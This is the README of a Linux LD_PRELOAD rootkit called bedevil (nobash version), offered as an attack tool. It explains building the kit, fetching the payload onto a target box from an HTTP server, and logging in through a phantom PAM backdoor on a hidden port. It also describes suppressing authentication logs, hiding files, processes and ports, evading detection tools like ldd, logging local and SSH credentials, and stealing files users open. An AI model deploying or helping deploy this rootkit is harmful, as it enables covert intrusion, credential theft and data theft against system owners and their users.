# bedevil-nobash

<img src=https://i.imgur.com/PyO00vy.png alt="icon" />

</br>

 * Based on my other rootkit, [vlany](https://github.com/mempodippy/vlany)
 * bedevil is designed to be more robust, faster and efficient than vlany.

## Overview
 * This is an LD_PRELOAD rootkit. Therefore, this rootkit runs in userland.
 * This is the same as the [original bdvl](https://github.com/kcaaj/bdvl) but however this version eliminates the need for bash.
   * So naturally this repository is much different from the original.
   * You can view the original [here]().
 * During the creation of this rootkit I had some goals in mind.
   * Tidy up previously existing aspects of precursor (LD_PRELOAD) rootkits.
   * Fix outstanding issues. (from vlany)
   * Create a more manageable & _robust_ system of rootkit functionalities.
   * Working on anything in vlany just felt like a huge mess, I grew to hate this. I knew it could be better...
 * When it comes to actual rootkit dependencies, there are only a few.
   * Most will already be installed.
   * Those that aren't will be installed before rootkit installation.
 * The dynamic linker libraries are patched at installation as to overwrite the original location the dynamic linker reads from when preloading stuff. (`/etc/ld.so.preload`)
   * If you are not a fan of this you can change the value of `PRELOAD_FILE` in `setup.py` to point to the original & uncomment the line which instructs `auto.sh` to patch the dynamic linker.

<hr>

## Usage
 * This repository is extremely simple in comparison to the original.
 * Getting an installation up & running is a matter of editing your backdoor settings in `setup.py` & just few brief commands.
```
 $ make
rm -rf new_inc
python setup.py
Username: changeme
Password: px0kFNAi
Hidden port: 26871

        sh etc/ssh.sh changeme <host> 26871 # px0kFNAi

cc -std=gnu99 -Wall -Inew_inc -g0 -O0 -shared -Wl,-soname,bdvl.so.x86_64 -fPIC new_inc/bedevil.c -lc -ldl -lcrypt -lpcap -o bdvl.so.x86_64
cc -m32 -std=gnu99 -Wall -Inew_inc -g0 -O0 -shared -Wl,-soname,bdvl.so.i686 -fPIC new_inc/bedevil.c -lc -ldl -lcrypt -lpcap -o bdvl.so.i686 2>/dev/null
make: [Makefile:17: kit] Error 1 (ignored)
strip bdvl.so*
```
 * When it comes to the actual installation, you have two choices.
 * Host the result (_in this case_) `changeme.b64` file somewhere accessible from the target box & point the first variable in `auto.sh` to wherever `changeme.b64` may be.
 * Or, on the box, when running `auto.sh` supply it a path as an argument to this file wherever it is.
 * `auto.sh` will do the rest of the work for when it comes to installation on the box.

### Example usage
 * On my own machine here, I've configured bdvl how I like & have built it.

<img src=https://i.imgur.com/TV9FXSe.png alt=building-bdvl />

 * In this example I am using `auto.sh` to grab the result (__changeme.b64__) from a _Python HTTPServer_ I've got running for this purpose.
 * The last command sent in that screenshot is once the target box is listening for my connection, as seen in the example below.

<img src=https://i.imgur.com/EqpLDU0.png alt=installation-process />

 * In this example I had commented out the line in `auto.sh` responsible for installing the dependencies for the rootkit.
 * This won't usually be the case, so there will be much more output normally, due to that fact.
 * After this finishes successfully, you will be able to log into the backdoor with the credentials specified.

<img src=https://i.imgur.com/8Q095B9.png alt=first-backdoor-login />

## Features & configuration information
 * Listed in the table below is a very concise overview of all of the functionalities that bedevil has.
 * Most can be enabled/disabled from within `setup.py` & the others in `config.h`.

| Toggle                   | Info                                                            |
| :----------------------- | :-------------------------------------------------------------- |
| __USE_PAM_BD__           | allows interactive login as a backdoor user via ssh             |
| __LOG_LOCAL_AUTH__       | log successful user authentications on the box                  |
| __HIDE_SELF__            | hides files and processes based on rootkit magic GID            |
| __FORGE_MAPS__           | hides rootkit presence from process map files                   |
| __HIDE_PORTS__           | hides ports & port ranges defined in 'hide_ports' file          |
| __DO_REINSTALL__         | maintains the rootkit's preload file                            |
| __DO_EVASIONS__          | hides rootkit presence from unsavoury processes                 |
| __READ_GID_FROM_FILE__   | magic GID value is changeable from backdoor shell via command.  |
| __AUTO_GID_CHANGER__     | the magic GID will refresh every so often. see comments.        |
| __HIDE_MY_ASS__          | keep track of all files created by rootkit user (for rehiding). |
| __PATCH_SSHD_CONFIG__    | this will keep `UsePAM` & `PasswordAuthentication` enabled      |
| __ROOTKIT_BASHRC__       | the rootkit will write & lock down `.bashrc` & `.profile`       |
| __BACKDOOR_UTIL__        | allows access to a host of backdoor utilities. see comments.    |
| __SET_MAGIC_ENV_UNHIDE__ | set magic env var in `./bdv unhideself` shell process.          |
| __BACKDOOR_PKGMAN__      | safe package management access from backdoor shell.             |
| __LOG_SSH__              | logs login attempts from over ssh                               |
| __FILE_STEAL__           | steal specified files when opened & accessed by users           |
| __CLEAN_STOLEN_FILES__   | remove stolen files every `FILE_CLEANSE_TIMER` seconds          |
| __USE_CRYPT__            | to use or not to use libcrypt                                   |

 * By default, all are enabled.
 * Be warned that (_this version of_) the rootkit is not designed to be used with a lot of these features disabled.
 * Irregular behaviour & general weirdness may occur.
 * I am slowly making this better. Until then I recommend keeping everything enabled...

<hr>

#### Backdoor utility commands
 * By hooking the execve & execvp wrappers bdvl provides rootkit-related commands from a backdoor shell, accessible by running `./bdv`.

<img src=https://i.imgur.com/2VGlU6j.png alt=available-backdoor-commands-in-bdvl />

<hr>

#### Magic GID
 * __READ_GID_FROM_FILE__ allows changing of the rootkit's magic GID whenever you like.
 * There is a command available from within the backdoor for manual changing of the rootkit's GID.
   * `./bdv changegid`
 * __AUTO_GID_CHANGER__ is more or less what it sounds like. The rootkit will refresh its magic GID __at least__ every `GID_CHANGE_MINTIME` seconds.
   * This value can be found in [`setup.py`](https://github.com/kcaaj/bdvl/blob/nobash/setup.py)
   * The rootkit will not automatically change its GID when there are still rootkit processes running.
   * Otherwise there is a pretty high chance of being discovered since previous processes left with the previous GID would be visible.
 * __HIDE_MY_ASS__ is intended to be a means of keeping track of files created, __outside of the installation directory__, by (you) the rootkit user.
   * _For the sole purpose of rehiding them all when changing magic GID, be it manually or an automatically scheduled/timed change._
   * Paths are automatically kept track of upon creation in a backdoor shell/general rootkit process.
   * The file which contains all can be found in `my_ass` within the installation directory.
     * Paths in here will be rehidden upon GID changes.
     * If you are to unhide a path after its creation (path GID = 0), it will simply be ignored when the magic GID is being changed & files are subsequently being hidden.
     * If you would like to stop a path from being automatically rehidden upon a GID change just remove the path's line.

<hr>

#### PAM backdoor
 * By hijacking libpam & libc's authentication functions, we are able to create a phantom backdoor user.
 * During installation you're given a username & password.
   * By default the username & password are randomly generated.
   * You can specify a username and/or password of your own by setting them before running `bedevil.sh`.
     * i.e.: `BD_UNAME=myusername BD_PWD=mypassword ./bedevil.sh ...`
 * [`etc/ssh.sh`](https://github.com/kcaaj/bdvl/blob/nobash/etc/ssh.sh) makes logging into your PAM backdoor with your hidden port that bit easier.
 * The responsible [utmp & wtmp functions](https://github.com/kcaaj/bdvl/tree/nobash/inc/hooks/utmp) have been hooked & information that may have indicated a backdoor user on the box is no longer easily visible.
 * Additionally the functions responsible for writing authentication logs have been hooked & intercepted to totally stop any sort of logs being written upon backdoor login.
   * See these hooks, [here (syslog)](https://github.com/kcaaj/bdvl/tree/nobash/inc/hooks/syslog) & [here (pam_syslog)](https://github.com/kcaaj/bdvl/blob/nobash/inc/backdoor/pam/pam_syslog.c).
   * _If the parent process of whatever is trying to write said auth log is that of a hidden process, the function in question simply does nothing._
   * Previously in bedevil, when interacting with the PAM backdoor, a log would be written stating that a session had been opened/closed for the root user.
   * So now this is no longer the case...
 * A problem with using this is that `UsePAM` & `PasswordAuthentication` must be enabled in the sshd config.
   * __PATCH_SSHD_CONFIG__ takes care of this problem.
   * See [here](https://github.com/kcaaj/bdvl/blob/nobash/inc/backdoor/sshdpatch/sshdchk.c) on the how & when this functionality works.
 * The rootkit's installation directory & your backdoor home directory are in two totally different & random locations.
   * I figured it was pretty important to separate the two spaces.
   * When no rootkit processes are running (_i.e.: not logged into the backdoor_) the rootkit will remove your `.bashrc` & `.profile`, that is until you log back in.
   * I have made everything easily accessible from the backdoor's home directory by plopping symlinks to everything you may need access to.
     * Not unlike `.bashrc` & `.profile` these symlinks are removed from the home directory until you log in.

<hr>

#### File stealing
 * Files that will be stolen are defined in `setup.py` (__INTERESTING_FILES__).
 * Wildcards apply to filenames.
   * i.e.: `INTERESTING_FILES = ['*.html', '*.php', 'backup.*']`
   * You can also specify paths & they'll also support wildcards.
 * You may want to consult the default target files & the other settings surrounding it...
 * Files already stolen will be removed at least every `FILE_CLEANSE_TIMER` seconds.
   * The default value for this is once each day.
   * Change `CLEAN_STOLEN_FILES` to `False` to disable this.
 * By default the rootkit will only steal files with a size of `MAX_FILE_SIZE` bytes.
   * __The default limit for this value is 5mb.__
   * Set this value to `None` & the rootkit will steal target files regardless of size.
   * Keep in mind however that the rootkit does need to allocate memory for the contents of the file.
 * Target files are stolen in the user's process so we aren't weirdly modifying file access times by doing this.
 * A file referenced by something such as `rm` by a user will be stolen before being removed.
   * `rm` is just a random example. This same logic applies for anything.
 * If a file has been stolen already, it will be ignored.
   * However if there has been a change in size since the last time it was stolen, it will be re-stolen.

<hr>

#### Credential logging
 * __LOG_LOCAL_AUTH__
   * bedevil will intercept `pam_vprompt` and log successful authentications on the box.
   * Log results are available in your installation directory.
 * __LOG_SSH__
   * bedevil intercepts `read` and `write` in order to log login attempts over ssh.
   * Again, logs are available in your installation directory.

<hr>

#### Evasion & hiding

##### Port hiding
 * With bedevil installed, you can hide or unhide any ports/ranges on the box by editing the `hide_ports` file in the rootkit's installation directory.
 * Additionally, before any configuration/setup, you can define what ports/ranges will be hidden by writing them to `inc/hide_ports`.
```
$ cat hide_ports
9146
304-306
1000-1003
```
*Where a hyphen is the range delimiter...*

##### Rootkit presence
 * bedevil will hide itself from the process memory map files upon being read.
 * Reading `/proc/*/*maps`, when bedevil is installed won't reveal the kit's location.
 * __HOWEVER__, dependencies required by the rootkit will be visible. (namely, libcrypt & libssl)

##### Scary things
 * bedevil will hide from defined scary processes, paths & environment variables.
 * See [`inc/hiding/evasion/evasion.h`](https://github.com/kcaaj/bdvl/blob/nobash/inc/hiding/evasion/evasion.h) for the things that bedevil will evade.
 * i.e.: Running `ldd`.
   * Calling `ldd` as a regular user will show an error.
   * This user's privileges do not suffice.
   * The calling process __must__ have the power to uninstall & reinstall our rootkit.
   * Running `ldd` again with sufficient privilege will show a totally clean output.
   * This is because, during the runtime of (_in this case_) `ldd` the rootkit is not installed.
   * Upon the application exiting/returning, the parent (rootkit) process of whatever just finished running reinstalls the rootkit.


<!--

RANDOM NOTES:
  having DO_EVASIONS enabled allows a 'bug' where a root user can
  uninstall the rootkit by running ldd through an infinite
  loop. i.e.: `while true; do ldd /bin/echo; done`

LINKS OF INTEREST:
 - https://pastebin.com/rZvjDzFK

asddsadsad

-->